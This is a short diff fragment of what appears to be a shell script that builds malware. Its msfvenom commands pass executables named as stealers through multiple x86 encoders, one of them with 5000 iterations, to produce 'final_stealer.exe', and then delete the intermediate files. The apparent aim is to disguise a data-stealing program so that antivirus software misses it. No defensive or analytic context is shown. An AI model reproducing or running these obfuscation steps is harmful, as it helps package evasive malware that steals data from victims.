@@ -13,5 +13,6 @@ msfvenom -x temp_stealer.exe -p generic/custom --arch x86 -e x86/shikata_ga_nai 
 msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o final_stealer.exe
 
 # Temizlik
-rm temp_stealer.exe temp_stealer_v2.exe 
+rm temp_stealer.exe temp_stealer_v2.exe  
+
 exit
